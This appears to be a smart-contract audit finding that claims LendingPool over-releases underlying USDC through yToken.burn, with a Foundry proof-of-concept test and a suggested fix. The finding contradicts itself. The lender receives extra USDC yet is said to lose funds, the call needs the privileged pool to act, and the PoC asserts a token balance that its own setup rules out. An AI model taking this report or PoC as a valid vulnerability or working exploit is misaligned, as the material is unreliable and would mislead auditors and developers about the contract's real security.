# LendingPool will drain funds from lenders by over-releasing underlying in burn

### Summary

The lack of validation in burn will cause a significant fund loss for lenders as LendingPool will release more underlying tokens than yToken burned, inflating available assets without adjusting supply.

### Root Cause

In yToken.sol:47 the burn function treats yTokenAmount and underlyingTokenAmount as independent parameters without linking them to an exchange rate, allowing excess underlying release.
https://github.com/sherlock-audit/2025-02-yieldoor/blob/main/yieldoor/src/yToken.sol#L47

### Internal Pre-conditions

Lender needs to call deposit in LendingPool.sol to set yToken supply to be at least 200 USDC (depositing 200 USDC).
LendingPool needs to have sufficient underlying assets in yToken to allow a burn call releasing 100 USDC.

### External Pre-conditions

No external preconditions required.

### Attack Path

Lender calls deposit in LendingPool.sol, depositing 200 USDC and minting 200 yToken at a 1:1 initial rate.
LendingPool calls burn(lender, 50, 100) on yToken, burning 50 yToken from the lender’s balance and releasing 100 USDC to the lender.
Lender retains 150 yToken, but yToken contract now holds only 100 USDC due to the excess release.
Lender attempts to redeem 150 yToken, expecting 150 USDC but receiving only 100 USDC (or transaction reverts due to insufficient liquidity).

### Impact

The lenders suffer an approximate loss of 50 USDC (25% of their deposit in this scenario). The LendingPool (or its operator) gains 50 USDC directly from the over-released assets, assuming control or misconfiguration.


### PoC

// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../yToken.sol";
import "../LendingPool.sol";

contract BurnMismatchPoC is Test {
    yToken yTokenInstance;
    LendingPool lendingPool;
    address usdc = address(0x1);
    address lender = address(0x2);

    function setUp() public {
        lendingPool = new LendingPool();
        vm.startPrank(address(lendingPool));
        yTokenInstance = new yToken("yUSDC", "yUSDC", 6, usdc);
        vm.stopPrank();
        vm.etch(usdc, abi.encodePacked(type(IERC20).runtimeCode));
        deal(usdc, lender, 1000e6); // USDC has 6 decimals
        deal(usdc, address(yTokenInstance), 1000e6);
        vm.startPrank(lender);
        IERC20(usdc).approve(address(lendingPool), type(uint256).max);
        vm.stopPrank();
    }

    function testBurnMismatch() public {
        vm.prank(lender);
        lendingPool.deposit(usdc, 200e6, lender);
        assertEq(yTokenInstance.balanceOf(lender), 200e6);

        vm.startPrank(address(lendingPool));
        yTokenInstance.burn(lender, 50e6, 100e6);
        vm.stopPrank();
        assertEq(yTokenInstance.balanceOf(lender), 150e6);
        assertEq(IERC20(usdc).balanceOf(address(yTokenInstance)), 100e6);

        vm.prank(lender);
        vm.expectRevert(); // Insufficient liquidity
        lendingPool.redeem(usdc, 150e6, lender);
        // Loss: 50 USDC stolen
    }
}

### Mitigation

Enforce underlyingTokenAmount = yTokenAmount * LendingPool.exchangeRateOfReserve(underlyingAsset) / 1e27 within burn to ensure releases match burns according to the LendingPool’s exchange rate.
